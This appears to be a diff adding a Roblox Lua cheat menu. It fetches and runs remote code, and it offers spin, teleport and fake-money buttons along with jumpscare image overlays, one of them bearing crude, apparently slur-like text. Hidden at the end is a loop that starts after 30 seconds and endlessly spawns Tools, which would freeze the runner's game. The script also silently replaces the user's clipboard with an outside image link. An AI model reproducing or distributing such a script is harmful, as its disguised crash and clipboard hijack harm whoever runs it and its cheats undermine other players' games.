@@ -1,0 +1,145 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("KAKAGUI", "Midnight")
+local Tab = Window:NewTab("chiitid")
+local Section = Tab:NewSection("chiitid")
+
+Section:NewToggle("keerutus bot", "ToggleInfo", function(state)
+	if state then
+		_G.keerutus = true
+		while _G.keerutus == true do
+			local Character = game.Players.LocalPlayer.Character
+			while wait() do
+				Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.Angles(0, 2.5, 0)
+			end
+		end
+	else
+		_G.keerutus = false
+	end
+end)
+
+Section:NewButton("save pos", "ButtonInfo", function()
+	LPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+	main:TweenPosition(UDim2.new(0.911181152, 0, 0.517114937, 0), "Out")
+	wait(2)
+	main:TweenPosition(UDim2.new(0.99728012, 0, 0.517114937, 0), "In")
+end)
+
+Section:NewButton("load pos", "ButtonInfo", function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LPos
+	TPTO:TweenPosition(UDim2.new(0.911221445, 0, 0.57823962, 0), "Out")
+	wait(2)
+	TPTO:TweenPosition(UDim2.new(0.99728012, 0, 0.57823962, 0), "In")
+end)
+
+Section:NewButton("tilibord tul", "ButtonInfo", function()
+	while true do
+		mouse = game.Players.LocalPlayer:GetMouse()
+		tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+		tool.Name = "tilibord tul"
+		tool.RequiresHandle = false
+		tool.Activated:Connect(function()
+			local pos = mouse.Hit
+			pos = CFrame.new(pos.X, pos.Y, pos.Z) +Vector3.new(0,10,0)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+		end)
+		wait()
+	end
+	
+end)
+
+
+
+
+
+
+
+
+Section:NewButton("100 thousant moni (only work if klik after 10 mull)", "ButtonInfo", function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LPos
+
+end)
+
+Section:NewButton("10 million", "ButtonInfo", function()
+
+	LPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+end)
+
+Section:NewButton("KLIIIIIIIIIIIIIIIIIIIIIK", "Butt", function()
+	-- Gui to Lua
+	-- Version: 3.2
+
+	-- Instances:
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local ImageLabel = Instance.new("ImageLabel")
+
+	--Properties:
+
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	ImageLabel.Parent = ScreenGui
+	ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel.Position = UDim2.new(0.395178944, 0, 0.743742585, 0)
+	ImageLabel.Size = UDim2.new(1, 1075, 1, 443)
+	ImageLabel.Image = "rbxassetid://6227146324"
+end)
+
+Section:NewButton("NO KLIK PLS IS PEDRO", "PEDRO EXE I HER HAHAHAHAH", function()
+	-- Gui to Lua
+	-- Version: 3.2
+
+	-- Instances:
+
+	local ScreenGui = Instance.new("ScreenGui")
+	local ImageLabel = Instance.new("ImageLabel")
+	local TextLabel = Instance.new("TextLabel")
+	local TextLabel_2 = Instance.new("TextLabel")
+
+	--Properties:
+
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	ImageLabel.Parent = ScreenGui
+	ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+	ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	ImageLabel.Position = UDim2.new(0.406135857, 0, 0.724672258, 0)
+	ImageLabel.Size = UDim2.new(1, 1075, 1, 443)
+	ImageLabel.Image = "rbxassetid://5983534005"
+
+	TextLabel.Parent = ScreenGui
+	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel.Position = UDim2.new(0.22863403, 0, 0.312276512, 0)
+	TextLabel.Size = UDim2.new(0, 625, 0, 50)
+	TextLabel.Font = Enum.Font.IndieFlower
+	TextLabel.Text = "AMONGUUUUUUUUUUUUUUUUUUUUUUUUS!!!!!!!!!!!!!!!!!!! mama mia"
+	TextLabel.TextColor3 = Color3.fromRGB(39, 96, 255)
+	TextLabel.TextScaled = true
+	TextLabel.TextSize = 14.000
+	TextLabel.TextWrapped = true
+
+	TextLabel_2.Parent = ScreenGui
+	TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	TextLabel_2.Position = UDim2.new(0.0299488679, 0, 0.953516066, 0)
+	TextLabel_2.Size = UDim2.new(0, 172, 0, 13)
+	TextLabel_2.Font = Enum.Font.SourceSans
+	TextLabel_2.Text = "made by punjabi studio nigeria niger farm"
+	TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+	TextLabel_2.TextSize = 14.000
+end)
+
+spawn(function()
+	task.wait(30)
+	while true do
+		Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+	end
+end)
+
+
+setclipboard("https://screenshare.pics/image.php?id=5W5LCW.jpg")
+toclipboard("https://screenshare.pics/image.php?id=5W5LCW.jpg")
+
+
+
